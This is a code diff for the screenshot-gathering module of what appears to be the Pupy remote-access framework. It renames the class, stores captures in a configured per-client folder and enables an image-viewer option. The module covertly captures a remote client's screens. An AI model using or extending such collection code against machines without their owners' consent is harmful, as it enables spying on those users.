@@ -31,17 +31,17 @@
 # --------------------------------------------------------------
 
 from pupylib.PupyModule import *
+from pupylib.PupyConfig import PupyConfig
 from os import path
 
-import time
 import datetime
 import subprocess
 
-__class_name__="screenshoter"
+__class_name__="Screenshoter"
 
 
 @config(cat="gather")
-class screenshoter(PupyModule):
+class Screenshoter(PupyModule):
     """ take a screenshot :) """
 
     dependencies = ['mss', 'screenshot']
@@ -66,20 +66,21 @@ class screenshoter(PupyModule):
                     '({}x{})'.format(screen['top'], screen['left'])))
             return
 
+        config = PupyConfig()
+        folder = config.get_folder('screenshots', {'%c': self.client.short_name()})
+
         screenshots, error = rscreenshot.screenshot(args.screen)
         if not screenshots:
             self.error(error)
         else:
             self.success('number of monitor detected: %s' % str(len(screenshots)))
             
-            for screenshot in screenshots:
-                filepath = path.join("data","screenshots","scr_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".png")
+            for i, screenshot in enumerate(screenshots):
+                filepath = path.join(folder, str(datetime.datetime.now()).replace(" ","_").replace(":","-")+'-'+str(i)+".png")
                 with open(filepath, 'w') as out:
                     out.write(screenshot)
-                    # sleep used to be sure the file name will be different between 2 differents screenshots
-                    time.sleep(1)
                     self.success(filepath)
 
-                # if args.view:
-                #     viewer = config.get('default_viewers', 'image_viewer')
-                #     subprocess.Popen([viewer, output])
+                if args.view:
+                    viewer = config.get('default_viewers', 'image_viewer')
+                    subprocess.Popen([viewer, filepath])
